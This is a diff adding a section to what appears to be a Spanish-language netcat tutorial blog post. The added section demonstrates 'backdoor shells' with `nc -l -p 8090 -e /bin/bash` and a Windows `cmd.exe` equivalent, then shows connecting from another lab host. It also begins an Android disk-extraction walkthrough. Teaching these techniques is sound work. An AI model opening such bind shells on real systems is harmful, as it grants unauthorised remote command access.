@@ -114,6 +114,28 @@ user@hostb:~$ curl 192.168.56.100:80
 <h1>Hola, mundo!</h1>
 ```
 
+Otro clásico: _backdoor shells_
+
+```shell
+user@host-a:~$ nc -l -p 8090 -e /bin/bash
+```
+
+¡También en Windows!
+
+```shell
+c:\> nc -l -p 8090 -e cmd.exe
+```
+
+En el sistema remoto:
+
+```shell
+user@host-a:~$ nc host-a -p 8090
+hostname
+host-b
+```
+
+Más adelante añadiré otro post con cosas sobre shells inversas...
+
 Un poquito más complejo: extracción del disco completo de un dispositivo Android. Partimos de un dispositivo _rooteado_ (necesitaremos acceder al disco en modo bloque con `dd`) y conectado vía USB con `adb`. El dispositivo móvil tiene `busybox` instalado.
 
 Primero, haremos forward de un socket mediante adb usando un puerto arbitrario:
